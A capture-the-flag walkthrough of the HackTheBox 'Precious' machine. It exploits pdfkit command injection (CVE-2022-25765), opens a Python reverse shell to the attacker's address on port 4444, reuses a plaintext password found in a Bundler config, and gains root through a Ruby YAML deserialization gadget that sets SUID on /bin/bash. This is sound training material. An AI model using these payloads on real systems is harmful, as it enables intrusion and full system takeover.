# Precious HTB machine

**A machine with a web service that converts a local web-page to a PDF, which is vulnerable to command injection.**

First of all, we should add the ip of the machine into the hosts folder. This is sometimes needed for the DNS resolution.

- Go to etc/hosts and add the line "10.10.11.189 precious.htb". Save the file and open your vpn document with "openvpn name_of_vpn_document" from the terminal.

Opening the web page, we will see a field where we can submit a link to be converted into a pdf. If we enter "https://www.google.com/" we will get the "Cannot load remote URL!" response. So, we need to supply a local URL, which means that we will have to start an http server in our localhost.

- Go to terminal > python3 -m http.server

Once you have your http server running, go to the website and enter "http://ip:port/". In the ip field you should insert your localhost ip and in the port field you should insert the port of the http server(e.g 8000). But, how can you find the localhost ip?

The default gateway is eth0(eth0 device). But, all system traffic go over the tun0 interface (the VPN interface). Tun0 is a virtual interface. Your "clear" unencrypted traffic goes to tun0, where openvpn encapsulates and encrypts it, and sends it out of eth0 to the remote gateway, where it is decrypted. The lo(loopback device) is a special, virtual network interface that your computer uses to communicate with itself. It is used mainly for diagnostics and troubleshooting, and to connect to servers running on the local machine.

So, since the website is communicating with our PC through a vpn, we must use the ip of the tun0 interface.

- Go to terminal > ifconfig. Then copy the "inet" ip address(e.g 10.10.XX.XX)

So, our final link we look like this: "http://10.10.XX.XX:8000/". We can see that a pdf file is produced with the contents of the localhost website. We can examine the pdf further, using the "exiftool".

- Go to terminal > exiftool name_of_the_pdf_file. If we look the metadata closely, we see that the pdf file was generated by pdfkit v0.8.6. Searching about "pdfkit v0.8.6" on the web, we see that this version and all versions of pdfkit < v0.8.6 are linked with CVE-2022-25765 and CWE-78.

This article explains the vulnerability and the exploit: https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795

The article states that:

> If the provided parameter happens to contain a URL encoded character and a shell command substitution string, it will be included in the command that PDFKit executes to render the PDF.

> Of course, if the user can control completely the first argument of the PDFKit constructor, they can also exploit the command injection as long as it starts with "http"

So, if we sumbit the following payload, we should observe a 5 second delay. 

```
http://%20`sleep 5`
```

The %20 character is a url encoded character. URL encoding converts characters into a format that can be transmitted over the Internet. URLs can only be sent over the Internet using the ASCII character-set. Since URLs often contain characters outside the ASCII set, the URL has to be converted into a valid ASCII format. Any url encoded character can work in this case. (%20, %21, etc.)

The backticks that wrap the bash command, are not a quotation sign. They have a very special meaning. Everything you type between backticks is evaluated (executed) by the shell before the main command that encapsulates the command inside the backticks.

So, without the backticks, the bash command can not be executed. Now, since we can execute bash commands in the remote servers, things get easier. We will use a classic reverse shell via command injection. You can download, as a browser extension, a tool called "Hack-Tools". It contains useful commands used in hacking.

A reverse shell, also known as a remote shell or “connect-back shell,” takes advantage of the target system’s vulnerabilities to initiate a shell session and then access the victim’s computer. The goal is to connect to a remote computer and redirect the input and output connections of the target system’s shell so the attacker can access it remotely.

First, we should choose an unused port, to listen to. Our pc will be the listener and the htb server will connect to the port that we are listening to. After this, the input and output connections will be redirected, and we will have remote access to the htb server.

- Now, open your terminal and listen to an unused port.(e.g 4444)

```
nc -lnvp 4444
```

- We can use python to establish the reverse shell. 

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.XX.XX",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

- So, our last payload will be:

```
http://%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.XX.XX",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
```

Congrats! You connected to the remote server. If we execute "whoami", we can see that we are a user named "ruby". We can go to the home directory and see that there are 2 users, "henry" and "ruby". The user flag is in the henry folder, but since we are connected as ruby, we do not have permission to read the file. We must find a way to connect as the "henry" user.

The name ruby, and listing the contents of the server, will indicate that the "RubyGems" package manager is installed. RubyGems is a package manager for the Ruby programming language that provides a standard format for distributing Ruby programs and libraries (in a self-contained format called a "gem"), a tool designed to easily manage the installation of gems, and a server for distributing them. 

We can verify that, by executing "gem -v" to view the version of RubyGems.

Usually, you can use Bundler for gem dependency management but also for writing our own gems. Bundler provides a consistent environment for Ruby projects by tracking and installing the exact gems and versions that are needed.

Bundler creates a folder named ".bundle" where there are files used by Bundler (for example, configuration settings in .bundle/config). By executing "ls -la" in the "ruby" directory, we can check that there is indeed a ".bundle" folder. We can "cd .bundle" and "cat config" to display the configuration settings. We can see that the developer of this challenge placed the credentials of "henry" inside the "config" folder. 

```
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

Now, we can finally open the terminal and connect as the user "henry" and read the user flag.

```
ssh henry@10.10.11.189
```

Then enter "yes" and provide the password mentioned in the "config" file "Q3c1AqGHtoI0aXAYFH".

Congrats! You are logged in as "henry". You can "cat user.txt" to read the user flag.

We got the user flag. Now, we must find a way to get the root flag. To get the root flag, we should find a way to do a privilege escalation attack. We can try "sudo su", but there is no point since we do not know the "root" password. So, what are the privileges of the "henry" user?

Before trying to upload and execute the classic shell privelege escalation script "linpeas.sh", we can execute "sudo -l". The "-l" wildcard, lists the user's privileges or checks a specific command. We get the following response:

```
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

So, the user "henry" can execute a "root" command on the server, as it is mentioned above. How can we take advantage of this privilege? After checking the "/opt/update-dependencies.rb" file, we can see it's written in ruby. (thus the .rb extension)

```
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end

```

To leverage this ruby script, for executing a privilege excalation attack, we must understand what it contains. First, there is the "yaml" module. This module provides a Ruby interface for data serialization in YAML format. Serialization is the process of translating a data structure or object state into a format that can be stored or transmitted and reconstructed later. RubyGems is the Ruby standard module for publishing and managing third party libraries. The function "update_gems()" is empty and the function "list_from_file" calls a function from the "yaml" module called "load()". 

Let's search the web about the "yaml.load()" function. As we can see, it's a deserialisation function and it converts a YAML string into an object. YAML is a straightforward machine parsable data serialization format designed for human readability and interaction with scripting languages such as Perl and Python. Let's google "yaml.load function vulnerability" too see if we can leverage this function.

These articles describe the vulnerability of the yaml load functions:

https://semgrep.dev/blog/2022/testing-vulnerable-pyyaml-versions
https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/

So, in this case YAML deserialisation is the attack vector. In the second article, we can find the way we can structure the "dependencies.yml" file so we can execute bash commands.

```
---
- !ruby/object:Gem::Installer
   i: x
- !ruby/object:Gem::SpecFetcher
   i: y
- !ruby/object:Gem::Requirement
 requirements:
   !ruby/object:Gem::Package::TarReader
   io: &1 !ruby/object:Net::BufferedIO
     io: &1 !ruby/object:Gem::Package::TarReader::Entry
        read: 0
        header: "abc"
     debug_output: &1 !ruby/object:Net::WriteAdapter
        socket: &1 !ruby/object:Gem::RequestSet
            sets: !ruby/object:Net::WriteAdapter
                socket: !ruby/module 'Kernel'
                method_id: :system
            git_set: "chmod +s /bin/bash"
        method_id: :resolve
```

In "git_set" we can specify the bash command. The command "chmod +s /bin/bash" will allow our user to execute "/bin/bash" as the group that owns the file("root"). After creating the file "dependencies.rb" under the user "henry", we can execute:

```
sudo /usr/bin/ruby /opt/update_dependencies.rb
```

Then, we should check if we have root privileges for executing /bin/bash. 
(/bin/bash is the most common shell used as default shell for user login of the linux system)
We can do "ls -la /bin/bash" and see that we have indeed root privileges on /bin/bash.

We do have root privileges, but we are not "root"! We need to execute "/bin/bash -p" to match the ids between "henry" and "root". Some info about the "-p" wildcard: 

> Turned on whenever the real and effective user ids do not match. Disables processing of the $ENV file and importing of shell functions. Turning this option off causes the effective uid and gid to be set to the real uid and gid.

Finally, if we execute "whoami" we see that we are "root". Now, execute "cd /root" and "cat root.txt" to get the root flag.



